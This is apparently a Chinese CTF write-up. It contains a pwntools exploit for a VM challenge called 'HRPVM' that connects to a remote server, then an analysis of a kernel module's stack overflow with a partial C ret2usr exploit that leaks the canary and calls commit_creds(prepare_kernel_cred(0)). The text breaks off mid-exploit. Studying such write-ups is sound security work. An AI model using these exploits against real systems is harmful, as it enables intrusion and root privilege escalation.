<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./HRPVM&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;223.112.5.156&#x27;</span>,<span class="string">&#x27;51240&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x23C8)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;HRP-MACHINE$&quot;</span>,op)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ls</span>():</span></span><br><span class="line">    cmd(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">id</span>():</span></span><br><span class="line">    cmd(<span class="string">&quot;id&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file</span>(<span class="params">name,data</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;FILE NAME: &quot;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;FILE CONTENT: &quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cat</span>(<span class="params">name</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;cat &quot;</span>+name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do</span>(<span class="params">name</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;./&quot;</span>+name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reg</span>():</span></span><br><span class="line">    cmd(<span class="string">&quot;reg&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reboot</span>():</span></span><br><span class="line">    cmd(<span class="string">&quot;reboot&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span>(<span class="params">name</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;rm &quot;</span>+name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">de</span>():</span></span><br><span class="line">    cmd(<span class="string">&quot;DEBUG&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;USER NAME:&quot;</span>,<span class="string">&quot;HRPHRP&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;PASSWORD:&quot;</span>,<span class="string">&quot;PWNME&quot;</span>)</span><br><span class="line">holder = <span class="string">&quot;YHellow&quot;</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;[+]HOLDER:&quot;</span>,holder)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;mov rdi,35;mov rsi,0;call open 2;2;&quot;</span></span><br><span class="line">file(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>,payload)</span><br><span class="line">payload = <span class="string">&quot;mov rdi,1;mov rsi,36;mov rdx,100;call write 1;1;&quot;</span></span><br><span class="line">file(<span class="string">&quot;b&quot;</span>*<span class="number">0x8</span>,payload)</span><br><span class="line">payload = <span class="string">&quot;mov rdi,36;mov rsi,1001;call open 2;2;&quot;</span></span><br><span class="line">file(<span class="string">&quot;c&quot;</span>*<span class="number">0x8</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">28</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(i))</span><br><span class="line">    file(<span class="string">&quot;aaa&quot;</span>+<span class="built_in">str</span>(i),<span class="string">&quot;1&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">file(<span class="string">&quot;d&quot;</span>*<span class="number">0x8</span>,<span class="string">&quot;2&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line">do(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">de()</span><br><span class="line">p.sendlineafter(<span class="string">&quot;[+][DEBUGING]root# &quot;</span>,<span class="string">&quot;file input&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;FILE NAME:&quot;</span>,<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;[+][DEBUGING]root# &quot;</span>,<span class="string">&quot;mmap&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;[+]ADDR EXPEND:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x40000000</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;[+][DEBUGING]root# &quot;</span>,<span class="string">&quot;exit&quot;</span>)</span><br><span class="line"></span><br><span class="line">reboot()</span><br><span class="line">p.sendlineafter(<span class="string">&quot;USER NAME:&quot;</span>,<span class="string">&quot;HRPHRP&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;PASSWORD:&quot;</span>,<span class="string">&quot;PWNME&quot;</span>)</span><br><span class="line">holder = p64(<span class="number">0x40000000</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;[+]HOLDER:&quot;</span>,holder)</span><br><span class="line"></span><br><span class="line">do(<span class="string">&quot;c&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">do(<span class="string">&quot;b&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="kernel-test"><a href="#kernel-test" class="headerlink" title="kernel-test"></a>kernel-test</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">FILE=./_install/flag</span><br><span class="line">if test -f &quot;$FILE&quot;; then</span><br><span class="line">    cd ./_install &amp;&amp; find . | cpio -o --format=newc &gt; ../rootfs.img &amp;&amp;cd .. &amp;&amp;sh boot.sh	</span><br><span class="line">else</span><br><span class="line">	echo $1&gt;./_install/flag &amp;&amp; chmod 755 ./_install/flag &amp;&amp; cd ./_install &amp;&amp; find . | cpio -o --format=newc &gt; ../rootfs.img &amp;&amp;cd .. &amp;&amp;sh boot.sh</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">echo &quot;INIT SCRIPT&quot;</span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">cat /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line"></span><br><span class="line">chown 0:0 flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">insmod ./HRPKO.ko # 挂载内核模块</span><br><span class="line">chmod 777 /dev/test</span><br><span class="line"></span><br><span class="line">echo -e &quot;Boot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds&quot;</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"><span class="meta">#</span><span class="bash">setsid /bin/cttyhack setuidgid 0 /bin/sh <span class="comment"># 修改 uid gid 为 0 以提权 /bin/sh 至 root。</span></span></span><br><span class="line">poweroff -f # 设置 shell 退出后则关闭机器</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">HRP_module_read</span><span class="params">(file *file, <span class="keyword">char</span> *user, <span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> this_buf[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  <span class="built_in">memset</span>(&amp;this_buf[<span class="number">21</span>], <span class="number">0</span>, <span class="number">43</span>);</span><br><span class="line">  canary = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(this_buf, <span class="string">&quot;welcome to my house\n&quot;</span>);</span><br><span class="line">  printk(<span class="string">&quot;16USE MY read\n&quot;</span>);</span><br><span class="line">  copy_to_user(user, &amp;this_buf[size], <span class="number">0x40</span>LL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0x1BF52</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>执行 <code>read(fd,buf,0x40)</code>，返回下标为“0”的地方就是 canary </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">HRP_module_write</span><span class="params">(file *file, <span class="keyword">const</span> <span class="keyword">char</span> *user, <span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__();</span><br><span class="line">  printk(<span class="string">&quot;16USE MY write\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x300</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    _warn_printk(<span class="string">&quot;Buffer overflow detected (%d &lt; %lu)!\n&quot;</span>, <span class="number">0x300</span>LL, size);</span><br><span class="line">    BUG();</span><br><span class="line">  &#125;</span><br><span class="line">  _check_object_size(pwn, size, <span class="number">0LL</span>);</span><br><span class="line">  copy_from_user(pwn, user, size);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0x1BF52</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>把用户态传入的数据存储到 bss 中</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">HRP_module_ioctl</span><span class="params">(file *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> __int64 param)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  _QWORD leak[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v7 = v3;</span><br><span class="line">  canary = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( cmd )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;16[HRPModule:] Unknown ioctl cmd!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    leak[<span class="number">0</span>] = <span class="number">0x214F4E4F4E</span>LL;</span><br><span class="line">    leak[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">    printk(<span class="string">&quot;16[HRPModule:] NOTHING! %s\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)leak);</span><br><span class="line">    qmemcpy(leak, pwn, <span class="number">0x100</span>uLL);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>内核栈溢出</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>打比赛时看到栈溢出就先去做其他题目了，因为我从来没有尝试过在内核中打栈</p>
<p>就从这个题开始，了解一下内核栈的利用手法</p>
<p>基础的利用思路就是：</p>
<ul>
<li>利用 <code>HRP_module_read</code> 泄露 canary</li>
<li>利用 <code>HRP_module_write</code> 把 payload 写入 bss 段</li>
<li>利用 <code>HRP_module_ioctl</code> 把 payload 写入栈，完成 ret2usr</li>
</ul>
<p>由于没有限制 <code>kallsyms</code>，因此可以直接获取内核符号，在此之前我们需要知道 <code>commit_creds</code> 和 <code>prepare_kernel_cred</code> 的偏移：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmlinux-to-elf bzImage vmlinux</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">➜  easy-kernel python</span><br><span class="line">Python <span class="number">2.7</span><span class="number">.18</span> (default, Jul  <span class="number">1</span> <span class="number">2022</span>, <span class="number">12</span>:<span class="number">27</span>:04) </span><br><span class="line">[GCC <span class="number">9.4</span><span class="number">.0</span>] on linux2</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>vmlinux = ELF(<span class="string">&quot;./vmlinux&quot;</span>)</span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/\xe6\xa1\x8c\xe9\x9d\xa2/easy-kernel/vmlinux&#x27;</span></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    Version:  <span class="number">5.9</span><span class="number">.8</span></span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0xffffffff81000000</span>)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(vmlinux.sym[<span class="string">&#x27;commit_creds&#x27;</span>] - <span class="number">0xffffffff81000000</span>)</span><br><span class="line"><span class="string">&#x27;0xccc30&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(vmlinux.sym[<span class="string">&#x27;prepare_kernel_cred&#x27;</span>] - <span class="number">0xffffffff81000000</span>)</span><br><span class="line"><span class="string">&#x27;0xcd0a0&#x27;</span></span><br></pre></td></tr></table></figure>
<p>接下来就比较套路了，写入 canary 和 rbp，在返回地址处放一个 <code>commit_creds(prepare_kernel_cred(0))</code> 就可以了</p>
<p>完整 exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc exploit.c -static -masm=intel -g -o exploit</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">find_symbols</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, kallsyms_fd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0xccc30</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0xcd0a0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov %cs, user_cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov %ss, user_ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov %rsp, user_sp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span 